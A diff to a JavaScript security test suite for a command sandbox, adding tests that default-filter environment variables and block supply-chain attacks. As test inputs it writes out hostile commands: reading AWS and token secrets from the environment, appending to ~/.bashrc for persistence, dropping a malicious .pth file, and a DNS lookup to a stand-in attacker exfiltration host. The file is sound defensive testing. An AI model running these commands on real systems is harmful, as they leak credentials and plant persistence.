@@ -112,7 +112,6 @@ describe('Security Tests', () => {
         result.stdout.includes('secret1:key1'),
         'should use sandboxed credentials'
       );
-
       delete process.env.AWS_SECRET_ACCESS_KEY;
       delete process.env.AWS_ACCESS_KEY_ID;
     });
@@ -129,34 +128,41 @@ describe('Security Tests', () => {
       );
     });
 
-    it('should allow all env when no env specified', async () => {
+    it('should filter env variables by default to prevent leakage of credentials', async () => {
       process.env.SECURITY_TEST_VAR = 'test_value_123';
 
       const result = await new SaferExec()
-        .run('sh', ['-c', 'echo $SECURITY_TEST_VAR']);
+        .run('sh', ['-c', 'echo "VAR:${SECURITY_TEST_VAR}:VAR"']);
 
       strict.equal(result.exitCode, 0, 'should exit with code 0');
       strict.ok(
-        result.stdout.includes('test_value_123'),
-        'should inherit parent environment'
+        !result.stdout.includes('test_value_123'),
+        'should not inherit non-essential parent environment variable'
       );
-
       delete process.env.SECURITY_TEST_VAR;
     });
 
-    it('should override specific env vars while inheriting rest', async () => {
-      process.env.SECURITY_TEST_VAR = 'original';
-
+    it('should inherit essential env variables by default', async () => {
       const result = await new SaferExec()
-        .env('SECURITY_TEST_VAR', 'overridden')
+        .run('sh', ['-c', 'echo "PATH:${PATH}:PATH"']);
+
+      strict.equal(result.exitCode, 0, 'should exit with code 0');
+      strict.ok(
+        result.stdout.includes('/bin') || result.stdout.includes('/usr/bin'),
+        'should inherit essential PATH environment variable'
+      );
+    });
+
+    it('should allow explicit override and inclusion of custom env vars', async () => {
+      const result = await new SaferExec()
+        .env('SECURITY_TEST_VAR', 'explicit_value')
         .run('sh', ['-c', 'echo $SECURITY_TEST_VAR']);
 
       strict.equal(result.exitCode, 0, 'should exit with code 0');
       strict.ok(
-        result.stdout.includes('overridden'),
-        'should use overridden value'
+        result.stdout.includes('explicit_value'),
+        'should use custom environment variable value'
       );
-
       delete process.env.SECURITY_TEST_VAR;
     });
 
@@ -424,7 +430,7 @@ describe('Security Tests', () => {
       const result = await new SaferExec()
         .applyPolicy('npm')
         .env('npm_config_loglevel', 'debug')
-        .run('sh', ['-c', 'echo $npm_config_loglevel']);
+        .run('printenv', ['npm_config_loglevel']);
 
       strict.equal(result.exitCode, 0, 'should exit with code 0');
       strict.ok(result.stdout.includes('debug'), 'should use user override');
@@ -485,6 +491,64 @@ describe('Security Tests', () => {
       for (const result of results) {
         strict.equal(result.exitCode, 0, 'should exit with code 0');
       }
+    });
+  });
+
+  describe('Supply-Chain Attacks Protection', () => {
+    it('should block NPM malicious lifecycle script from reading sensitive host environment variables', async () => {
+      process.env.AWS_SECRET_ACCESS_KEY = 'super-secret-key';
+      const result = await new SaferExec()
+        .applyPolicy('npm')
+        .run('sh', ['-c', 'echo "KEY:${AWS_SECRET_ACCESS_KEY}:KEY"']);
+      delete process.env.AWS_SECRET_ACCESS_KEY;
+      strict.equal(result.exitCode, 0);
+      strict.ok(!result.stdout.includes('super-secret-key'), 'Should protect against exfiltration of env secrets');
+    });
+
+    it('should block NPM malicious script from downloading other executors (like bun) or exfiltrating data', async () => {
+      const result = await new SaferExec()
+        .applyPolicy('npm')
+        .disableNetwork()
+        .run('curl', ['-I', 'https://bun.sh']);
+      strict.notEqual(result.exitCode, 0, 'curl should fail to run or connect when network is disabled');
+    });
+
+    it('should block PyPI malicious package setup.py from writing to auto-start / persistence locations', async () => {
+      const userHome = process.env.HOME || '/';
+      const result = await new SaferExec()
+        .applyPolicy('pypi')
+        .run('sh', ['-c', `echo "malware" >> ${userHome}/.bashrc`]);
+      strict.notEqual(result.exitCode, 0, 'Should block writing malware persistence to .bashrc');
+    });
+
+    it('should block NPM malicious script trying to read base64-encoded env secrets or using indirect env command', async () => {
+      process.env.SUPER_SECRET_TOKEN = 'secret-val-abc';
+      const result = await new SaferExec()
+        .applyPolicy('npm')
+        .run('sh', ['-c', 'env | grep SUPER_SECRET_TOKEN']);
+      delete process.env.SUPER_SECRET_TOKEN;
+      strict.notEqual(result.exitCode, 0, 'Should block access or filter out the secret token even via env command');
+    });
+
+    it('should block compiler execution (gcc/clang) during NPM install to prevent compiling native binaries', async () => {
+      const result = await new SaferExec()
+        .applyPolicy('npm')
+        .run('gcc', ['--version']);
+      strict.notEqual(result.exitCode, 0, 'Should block native compilers under NPM policy');
+    });
+
+    it('should block PyPI package from writing into system python site-packages to prevent path injection', async () => {
+      const result = await new SaferExec()
+        .applyPolicy('pypi')
+        .run('sh', ['-c', 'mkdir -p /usr/lib/python3/site-packages && touch /usr/lib/python3/site-packages/malicious.pth']);
+      strict.notEqual(result.exitCode, 0, 'Should deny writing to system python directory');
+    });
+
+    it('should block DNS exfiltration attempts (nslookup/dig) under disabled network', async () => {
+      const result = await new SaferExec()
+        .disableNetwork()
+        .run('nslookup', ['malicious-exfiltrate.attacker.com']);
+      strict.notEqual(result.exitCode, 0, 'DNS query lookup should fail when network is disabled');
     });
   });
 });
